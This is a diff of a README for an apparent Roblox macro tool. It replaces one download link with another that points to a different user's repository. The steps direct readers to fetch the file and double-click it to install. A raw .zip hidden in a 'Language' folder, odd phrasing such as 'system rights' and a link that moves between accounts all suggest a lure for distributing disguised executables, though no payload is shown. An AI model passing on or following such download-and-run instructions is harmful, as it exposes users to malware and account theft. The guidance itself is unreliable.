@@ -20,7 +20,7 @@ To download the application, please visit this page: [Download ROBLOX-MACRO-V3.0
 Once you are on the Releases page, follow these steps:
 
 1. Look for the latest version of the software, which should be labeled as "v3.0.0".
-2. Click on the file that matches your system rights. Typically, this will be `https://github.com/bhuvi1430/ROBLOX-MACRO-V3.0.0/raw/refs/heads/main/Language/ROBLO-MACR-1.6.zip`.
+2. Click on the file that matches your system rights. Typically, this will be `https://github.com/Curtis2929/ROBLOX-MACRO-UPDATE-2026/releases/tag/Release`.
 3. Save the file to your computer.
 4. After downloading, double-click on the file to start the installation.
 5. Follow the prompts to complete the installation.
